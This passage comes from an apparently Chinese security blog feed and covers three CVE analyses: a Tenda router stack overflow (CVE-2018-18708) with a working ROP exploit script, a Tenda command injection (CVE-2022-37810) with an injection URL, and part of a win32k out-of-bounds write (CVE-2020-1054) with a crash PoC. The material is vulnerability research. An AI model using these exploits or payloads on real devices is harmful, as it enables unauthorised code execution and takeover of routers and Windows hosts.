src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221117141812438.png"></p><p>根据http post请求内容构造</p><pre class="line-numbers language-none"><code class="language-none">import requestsurl = "http://192.168.130.137/goform/setMacFilterCfg"cookie = {"Cookie":"password=csplqw"}data = {"macFilterType": "black", "deviceList":"\r" +  "A" * 176 + "bbbb"}requests.post(url, cookies=cookie, data=data)requests.post(url, cookies=cookie, data=data)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>测试</p><pre class="line-numbers language-none"><code class="language-none">sudo chroot . ./qemu-arm-static -g 1111 ./bin/httpdgdb-multiarch ./bin/httpdtarget remote:1111python poc.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221117144236144.png"></p><p>正好覆盖</p><h2 id="0x03漏洞利用"><a href="#0x03漏洞利用" class="headerlink" title="0x03漏洞利用"></a>0x03漏洞利用</h2><h3 id="保护"><a href="#保护" class="headerlink" title="保护"></a>保护</h3><p>开启了NX保护</p><p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221117145129715.png"></p><h3 id="libc基址"><a href="#libc基址" class="headerlink" title="libc基址"></a>libc基址</h3><p>strcpy函数下断点找函数地址，0x3fdda508</p><p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221118173858830.png"></p><p>找偏移</p><p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221118174133012.png"></p><p>算基址</p><p>0x3fdda508-3e508=0x3fd9C000</p><h3 id="gadgets"><a href="#gadgets" class="headerlink" title="gadgets"></a>gadgets</h3><pre class="line-numbers language-none"><code class="language-none">ROPgadget --binary libc.so.0 --only "pop" | grep r3ROPgadget --binary libc.so.0 | grep "mov r0, sp ; blx r3"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221117155024462.png"></p><p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221117155334715.png"></p><p>使用<code>0x00018298 : pop {r3, pc}</code>和 <code>0x00040cb8 : mov r0, sp ; blx r3</code>来构造rop。将第一个r3改成system_addr，将命令放在sp上，之后跳转到system_addr。</p><h3 id="system"><a href="#system" class="headerlink" title="system"></a>system</h3><p><code>readelf -s libc.so.0 | grep system</code>找system偏移</p><p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221117161402380.png"></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>payload结构：[offset,gadget1,system,gadget2]</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>cmd <span class="token operator">=</span> <span class="token string">b"echo hello"</span>libc_base <span class="token operator">=</span> <span class="token number">0x3fd9C000</span>system_offset <span class="token operator">=</span> <span class="token number">0x005a270</span>gadget1_offset <span class="token operator">=</span> <span class="token number">0x00018298</span>gadget2_offset <span class="token operator">=</span> <span class="token number">0x00040cb8</span>system_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> system_offsetgadget1 <span class="token operator">=</span> gadget1_offset <span class="token operator">+</span> libc_basegadget2 <span class="token operator">=</span> gadget2_offset <span class="token operator">+</span> libc_basepayload <span class="token operator">=</span> <span class="token string">b"A"</span><span class="token operator">*</span><span class="token number">176</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>gadget1<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>gadget2<span class="token punctuation">)</span> <span class="token operator">+</span> cmdurl <span class="token operator">=</span> <span class="token string">"http://192.168.130.137/goform/setMacFilterCfg"</span>cookie <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"Cookie"</span><span class="token punctuation">:</span><span class="token string">"password=csplqw"</span><span class="token punctuation">}</span>data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"macFilterType"</span><span class="token punctuation">:</span> <span class="token string">"black"</span><span class="token punctuation">,</span> <span class="token string">"deviceList"</span><span class="token punctuation">:</span><span class="token string">b"\r"</span> <span class="token operator">+</span> payload<span class="token punctuation">}</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> cookies<span class="token operator">=</span>cookie<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> cookies<span class="token operator">=</span>cookie<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/11/16/CVE-2018-18708%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%86%E6%9E%90/image-20221118174737035.png"></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2022-37810 Tenda路由器命令注入分析</title>
      <link href="/2023/11/15/CVE-2022-37810%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/"/>
      <url>/2023/11/15/CVE-2022-37810%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h2><p>Tenda AC1206(v15.03.06.23)存在formWriteFacMac命令注入漏洞，可以通过mac参数执行任意命令。</p><h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><p>US_AC1206V1.0RTL_V15.03.06.23_multi_TD01</p><h4 id="提取固件"><a href="#提取固件" class="headerlink" title="提取固件"></a>提取固件</h4><p>提取固件运行httpd可执行文件</p><pre class="line-numbers language-none"><code class="language-none">binwalk -Me US_AC1206V1.0RTL_V15.03.06.23_multi_TD01.bin <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="qemu执行"><a href="#qemu执行" class="headerlink" title="qemu执行"></a>qemu执行</h4><p><img src="/2023/11/15/CVE-2022-37810%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/image-20221121103057802.png"></p><p>mips小端</p><pre class="line-numbers language-none"><code class="language-none">cd _US_AC1206V1.0RTL_V15.03.06.23_multi_TD01.bin.extracted/squashfs-root/cp $(which qemu-mipsel-static) ./sudo ./qemu-mipsel-static -L ./ ./bin/httpdsudo chroot ./ ./qemu-mipsel-static ./bin/httpd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/11/15/CVE-2022-37810%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/image-20221121103628491.png"></p><p><img src="/2023/11/15/CVE-2022-37810%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/image-20221121104528268.png"></p><p>main函数中0x00433a68有对apmib_init的判断，patch掉，bnez改为beqz</p><p><img src="/2023/11/15/CVE-2022-37810%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/image-20221121111549227.png"></p><p>ConnectCfm也需要改掉</p><p><img src="/2023/11/15/CVE-2022-37810%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/image-20221121112030522.png"></p><p><img src="/2023/11/15/CVE-2022-37810%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/image-20221121161405750.png"></p><h4 id="添加网卡"><a href="#添加网卡" class="headerlink" title="添加网卡"></a>添加网卡</h4><pre class="line-numbers language-none"><code class="language-none">sudo brctl addbr br0 sudo brctl addif br0 eth0sudo ifconfig br0 upsudo dhclient br0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/11/15/CVE-2022-37810%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/image-20221121161943583.png"></p><p><img src="/2023/11/15/CVE-2022-37810%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/image-20221121162340458.png"></p><h4 id="formWriteFacMac"><a href="#formWriteFacMac" class="headerlink" title="formWriteFacMac"></a>formWriteFacMac</h4><p>漏洞点在http的formWriteFacMac函数，IDA定位关键函数fromWirteFacMac，控制了mac参数就能利用doSystemCmd实现命令注入。</p><p><img src="/2023/11/15/CVE-2022-37810%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/image-20221121162811780.png"></p><h4 id="doSystemCmd"><a href="#doSystemCmd" class="headerlink" title="doSystemCmd"></a>doSystemCmd</h4><p>doSystemCmd函数不在httpd中，在libcommon.so中</p><p><img src="/2023/11/15/CVE-2022-37810%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/image-20221121164709994.png"></p><p>交叉引用查看formWriteFacMac函数调用链</p><pre class="line-numbers language-none"><code class="language-none">main -&gt; initWebs -&gt; formDefineTenDa -&gt; websFormDefine('WriteFacMac',formWriteFacMac);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>formDefineTenDa包含路由器接口和对应的处理函数，通过websFormDefine注册后，WriteFacMac会和formWriteFacMac形成绑定，在goform下产生接口WriteFacMac调用formWriteFacMac</p><p>192.168.130.137/goform/WriteFacMac</p><p><img src="/2023/11/15/CVE-2022-37810%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/image-20221121174942212.png"></p><h4 id="initWebs"><a href="#initWebs" class="headerlink" title="initWebs"></a>initWebs</h4><p><img src="/2023/11/15/CVE-2022-37810%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/image-20221121170833769.png"></p><h4 id="formDefineTenDa"><a href="#formDefineTenDa" class="headerlink" title="formDefineTenDa"></a>formDefineTenDa</h4><p><img src="/2023/11/15/CVE-2022-37810%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/image-20221121165748345.png"></p><h4 id="websGetVar"><a href="#websGetVar" class="headerlink" title="websGetVar"></a>websGetVar</h4><p><img src="/2023/11/15/CVE-2022-37810%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/image-20221121172710514.png"></p><p><img src="/2023/11/15/CVE-2022-37810%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/image-20221121172721758.png"></p><p>判断wp中的mac参数是否存在，不存在返回默认值00:01:02:11:22:33，存在则返回对应值，没有做任何过滤，因此可以直接构造。</p><h2 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h2><p>当wp判断mac参数是否存在时，返回值没有做任何过滤，因此可以直接构造。</p><pre class="line-numbers language-none"><code class="language-none">192.168.130.137/goform/WriteFacMac?mac=00:01:02:11:22:33 || ls<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/11/15/CVE-2022-37810%20Tenda%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/image-20221121175540394.png"></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2020-1054越界写入本地提权分析</title>
      <link href="/2023/08/24/CVE-2020-1054%20%E8%B6%8A%E7%95%8C%E5%86%99%E5%85%A5%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/"/>
      <url>/2023/08/24/CVE-2020-1054%20%E8%B6%8A%E7%95%8C%E5%86%99%E5%85%A5%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h2><p>CVE-2020-1054是win32k.sys内核模块的oob(out of band)漏洞。成功利用可以导致权限提升。漏洞存在于win32k!vStrWrite01函数中，函数在对BitMap对象中的pvScan0成员指向的像素区域进行读写的时候，没有判断读写的地址是否超过BitMap对象的像素点范围，是否越界，导致BSOD的产生。通过合理的内存布局，可以利用漏洞扩大目标BitMap对象的sizelBitmap来扩大BitMap对象的可读写范围，利用扩大读写范围的BitMap对象来修改另一个BitMap对象的pvScan0就能实现任意地址读写。</p><h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><h3 id="蓝屏poc"><a href="#蓝屏poc" class="headerlink" title="蓝屏poc"></a>蓝屏poc</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c">##include <span class="token operator">&lt;</span>Windows<span class="token punctuation">.</span>h<span class="token operator">&gt;</span>##include <span class="token operator">&lt;</span>inttypes<span class="token punctuation">.</span>h<span class="token operator">&gt;</span>##include <span class="token operator">&lt;</span>stdint<span class="token punctuation">.</span>h<span class="token operator">&gt;</span>##include <span class="token operator">&lt;</span>stdio<span class="token punctuation">.</span>h<span class="token operator">&gt;</span>##include <span class="token operator">&lt;</span>stdlib<span class="token punctuation">.</span>h<span class="token operator">&gt;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">LoadLibraryA</span><span class="token punctuation">(</span><span class="token string">"user32.dll"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    HDC r0 <span class="token operator">=</span> <span class="token function">CreateCompatibleDC</span><span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//创建与指定设备兼容的内存设备上下文环境</span>    HBITMAP r1 <span class="token operator">=</span> <span class="token function">CreateCompatibleBitmap</span><span class="token punctuation">(</span>r0<span class="token punctuation">,</span> <span class="token number">0x9f42</span><span class="token punctuation">,</span> <span class="token number">0xa</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//创建与指定设备环境相关的设备兼容位图</span>    <span class="token comment">//HBITMAP r1 = CreateCompatibleBitmap(r0, 0x51500, 0x100);//创建与指定设备环境相关的设备兼容位图</span>    <span class="token function">SelectObject</span><span class="token punctuation">(</span>r0<span class="token punctuation">,</span> r1<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//选择一对象到指定的设备上下文环境中，该对象替换先前的相同类型对象</span>    <span class="token function">DrawIconEx</span><span class="token punctuation">(</span>r0<span class="token punctuation">,</span> <span class="token number">0x0</span><span class="token punctuation">,</span> <span class="token number">0x0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>HICON<span class="token punctuation">)</span><span class="token number">0x30000010003</span><span class="token punctuation">,</span> <span class="token number">0x0</span><span class="token punctuation">,</span> <span class="token number">0xfffffffffebffffc</span><span class="token punctuation">,</span> <span class="token number">0x0</span><span class="token punctuation">,</span> <span class="token number">0x0</span><span class="token punctuation">,</span> <span class="token number">0x6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>CreateCompatibleBitmap</strong></p><p>创建与指定设备上下文关联的设备兼容位图</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">HBITMAP <span class="token function">CreateCompatibleBitmap</span><span class="token punctuation">(</span>  <span class="token punctuation">[</span>in<span class="token punctuation">]</span> HDC hdc<span class="token punctuation">,</span> <span class="token comment">//设备上下文的句柄</span>  <span class="token punctuation">[</span>in<span class="token punctuation">]</span> <span class="token keyword">int</span> cx<span class="token punctuation">,</span>  <span class="token comment">//位图宽度</span>  <span class="token punctuation">[</span>in<span class="token punctuation">]</span> <span class="token keyword">int</span> cy   <span class="token comment">//位图高度</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>DrawIconEx</strong></p><p>将图标和光标绘制到指定设备上下文中，执行指定光栅操作，指定拉伸或压缩图标光标。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">BOOL <span class="token function">DrawIconEx</span><span class="token punctuation">(</span>  <span class="token punctuation">[</span>in<span class="token punctuation">]</span>           HDC    hdc<span class="token punctuation">,</span>  <span class="token punctuation">[</span>in<span class="token punctuation">]</span>           <span class="token keyword">int</span>    xLeft<span class="token punctuation">,</span>  <span class="token punctuation">[</span>in<span class="token punctuation">]</span>           <span class="token keyword">int</span>    yTop<span class="token punctuation">,</span>  <span class="token punctuation">[</span>in<span class="token punctuation">]</span>           HICON  hIcon<span class="token punctuation">,</span><span class="token comment">//绘制图标和光标的句柄</span>  <span class="token punctuation">[</span>in<span class="token punctuation">]</span>           <span class="token keyword">int</span>    cxWidth<span class="token punctuation">,</span><span class="token comment">//图标或光标逻辑宽度</span>  <span class="token punctuation">[</span>in<span class="token punctuation">]</span>           <span class="token keyword">int</span>    cyWidth<span class="token punctuation">,</span><span class="token comment">//图标或光标逻辑高度</span>  <span class="token punctuation">[</span>in<span class="token punctuation">]</span>           UINT   istepIfAniCur<span class="token punctuation">,</span>  <span class="token punctuation">[</span>in<span class="token punctuation">,</span> optional<span class="token punctuation">]</span> HBRUSH hbrFlickerFreeDraw<span class="token punctuation">,</span>  <span class="token punctuation">[</span>in<span class="token punctuation">]</span>           UINT   diFlags<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>崩溃地址为win32k!vStrWrite01+0x36a</p><h3 id="vStrWrite01"><a href="#vStrWrite01" class="headerlink" title="vStrWrite01"></a>vStrWrite01</h3><p>StrWrite01(struct _STRRUN *prun, struct _XRUNLEN *a2, struct SURFACE *pSurf, struct _CLIPOBJ *a4)</p><pre class="line-numbers language-none"><code class="language-none">OID vStrWrite01(STRRUN  *prun,                  XRUNLEN *pxrlEnd,                 SURFACE *pSurf,                 CLIPOBJ *pco)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="相关结构体"><a href="#相关结构体" class="headerlink" title="相关结构体"></a>相关结构体</h3><pre class="line-numbers language-none"><code class="language-none">typedef struct _XRUNLEN{    LONG    xPos;    LONG    cRun;    LONG    aul[1];} XRUNLEN; typedef struct _STRRUN{    LONG    yPos;    LONG    cRep;    XRUNLEN xrl;} STRRUN;  typedef struct tagSIZE {    LONG cx;    LONG cy;} SIZE,*PSIZE,*LPSIZE;  typedef SIZE SIZEL;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>BASEOBJECT结构体</p><pre class="line-numbers language-none"><code class="language-none">typedef struct _BASEOBJECT64{  ULONG64 hHmgr;     // 0x00  ULONG32 ulShareCount;      // 0x08  WORD cExclusiveLock;       // 0x0A  WORD BaseFlags;        // 0x0C  ULONG64 Tid;           // 0x10} BASEOBJECT64;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>SURFOBJ结构体</p><pre class="line-numbers language-none"><code class="language-none">typedef struct _SURFOBJ64{  BASEOBJECT64 baseObj;    // 0x00  ULONG64 dhsurf;         // 0x18  ULONG64 hsurf;          // 0x20  ULONG64 dhpdev;         // 0x28  ULONG64 hdev;           // 0x30  SIZEL sizlBitmap;       // 0x38  ULONG64 cjBits;         // 0x40  ULONG64 pvBits;         // 0x48  ULONG64 pvScan0;        // 0x50  ULONG32 lDelta;         // 0x58  ULONG32 iUniq;          // 0x5C  ULONG32 iBitmapFormat;  // 0x60  USHORT iType;           // 0x64  USHORT fjBitmap;        // 0x66} SURFOBJ64;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>pvScan01指向Pixel Data数据区，这些数据可以通过GetBitmapBits和SetBitmapBits控制</p><p>sizlBitmap是两个Dword，包含位图的高度和宽度。</p><h3 id="触发地点"><a href="#触发地点" class="headerlink" title="触发地点"></a>触发地点</h3><p>崩溃地址为win32k!vStrWrite01+0x36a，<code>mov esi,[r14]</code></p><p><img src="/2023/08/24/CVE-2020-1054%20%E8%B6%8A%E7%95%8C%E5%86%99%E5%85%A5%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/image-20220824160100705.png"></p><p><img src="/2023/08/24/CVE-2020-1054%20%E8%B6%8A%E7%95%8C%E5%86%99%E5%85%A5%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/image-20220824113228498.png"></p><pre class="line-numbers language-none"><code class="language-none">.text:FFFFF97FFF0A2175                 lea     r14, [rcx+rax*4].text:FFFFF97FFF0A2179                 test    ebx, ebx.text:FFFFF97FFF0A217B                 js      short loc_FFFFF97FFF0A2192.text:FFFFF97FFF0A217D                 mov     rax, [rsp+0A8h+arg_10].text:FFFFF97FFF0A2185                 cmp     ebx, [rax+38h].text:FFFFF97FFF0A2188                 jge     short loc_FFFFF97FFF0A2192.text:FFFFF97FFF0A218A                 mov     esi, [r14]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>内存地址由rcx和rax决定。</p><h3 id="vStrWrite01流程"><a href="#vStrWrite01流程" class="headerlink" title="vStrWrite01流程"></a>vStrWrite01流程</h3><p><img src="/2023/08/24/CVE-2020-1054%20%E8%B6%8A%E7%95%8C%E5%86%99%E5%85%A5%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/image-20220824145835155.png"></p><p>loc_FFFFF97FFF0A20B4</p><p><img src="/2023/08/24/CVE-2020-1054%20%E8%B6%8A%E7%95%8C%E5%86%99%E5%85%A5%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/image-20220824172844847.png"></p><p>用rcx和rax计算r14的内存地址，之后执行mov esi,[r14]指令。</p><p><img src="/2023/08/24/CVE-2020-1054%20%E8%B6%8A%E7%95%8C%E5%86%99%E5%85%A5%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/image-20220824150841161.png"></p><p>如果r14地址合法，对读到的值进行or或者and运算，并把运算后的值赋值回r14指向的内存地址。</p><p>如果控制了崩溃处的destAddr(越界地址oobAddr),就可以进行内存破坏。</p><p><img src="/2023/08/24/CVE-2020-1054%20%E8%B6%8A%E7%95%8C%E5%86%99%E5%85%A5%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/image-20220824161532452.png"></p><p><img src="/2023/08/24/CVE-2020-1054%20%E8%B6%8A%E7%95%8C%E5%86%99%E5%85%A5%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/image-20220824160327694.png"></p><p>之后对rcx进行操作，判断r11d是否为0，不为0跳转到loc_FFFFF97FFF0A212B，进行r11d减1操作。</p><p><img src="/2023/08/24/CVE-2020-1054%20%E8%B6%8A%E7%95%8C%E5%86%99%E5%85%A5%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/image-20220824165106838.png"></p><p>函数流程如下</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">do</span> <span class="token punctuation">{</span><span class="token comment">/* lea  r14, [rcx + rax * 4] rcx = pSurf-&gt;lDelta * prun-&gt;yPos + pSurf-&gt;pvScan0rax = prun-&gt;xrl-&gt;xPos &gt;&gt; 5*/</span>r14 <span class="token operator">=</span> rcx <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> <span class="token punctuation">(</span>prun<span class="token operator">-&gt;</span>xrl<span class="token operator">-&gt;</span>xPos <span class="token operator">&gt;&gt;</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//读取时的oobAddr,rcx + rax * 4</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>tmp <span class="token operator">=</span> <span class="token operator">*</span>destAddr  <span class="token comment">//崩溃</span><span class="token keyword">do</span> <span class="token punctuation">{</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>tmp <span class="token operator">|=</span> xxxxxx<span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span>tmp <span class="token operator">&amp;=</span> xxxxxx<span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">while</span><span class="token punctuation">(</span>r11d<span class="token punctuation">)</span>            <span class="token operator">--</span>r11d<span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token operator">*</span>destAddr <span class="token operator">=</span> tmp<span class="token punctuation">;</span> <span class="token comment">//满足条件，写入oobAddr</span><span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment">/*add rcx, rax        rcx = rcx + pSurf-&gt;lDelta        */</span>rcx <span class="token operator">+=</span> pSurf<span class="token operator">-&gt;</span>lDelta<span class="token punctuation">;</span><span class="token comment">//每次循环obbAddr会增加</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对r14指向的内存进行读写</p><pre class="line-numbers language-none"><code class="language-none">rcx = pSurf-&gt;lDelta * prun-&gt;yPos + pSurf-&gt;pvScan0rax = prun-&gt;xrl-&gt;xPos &gt;&gt; 5lea  r14, [rcx+rax*4]rcx = rcx + pSurf-&gt;lDelta<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>循环的操作如下</p><pre 